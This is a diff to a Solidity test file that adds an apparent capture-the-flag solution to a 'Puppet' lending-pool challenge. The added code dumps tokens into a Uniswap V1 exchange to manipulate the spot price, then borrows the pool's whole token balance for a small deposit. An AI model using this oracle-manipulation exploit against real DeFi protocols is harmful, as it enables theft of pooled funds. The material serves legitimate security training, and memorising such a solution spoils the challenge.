@@ -92,7 +92,16 @@ contract PuppetChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_puppet() public checkSolvedByPlayer {
-        
+        // Creating one contract from player bumps nonce to 1, matching challenge constraint.
+        new NonceBump();
+
+        token.approve(address(uniswapV1Exchange), PLAYER_INITIAL_TOKEN_BALANCE);
+
+        // Dump all player tokens for ETH to manipulate spot price in the Uniswap pair.
+        uniswapV1Exchange.tokenToEthSwapInput(PLAYER_INITIAL_TOKEN_BALANCE, 1, block.timestamp * 2);
+
+        uint256 requiredDeposit = lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE);
+        lendingPool.borrow{value: requiredDeposit}(POOL_INITIAL_TOKEN_BALANCE, recovery);
     }
 
     // Utility function to calculate Uniswap prices
@@ -116,3 +125,5 @@ contract PuppetChallenge is Test {
         assertGe(token.balanceOf(recovery), POOL_INITIAL_TOKEN_BALANCE, "Not enough tokens in recovery account");
     }
 }
+
+contract NonceBump {}
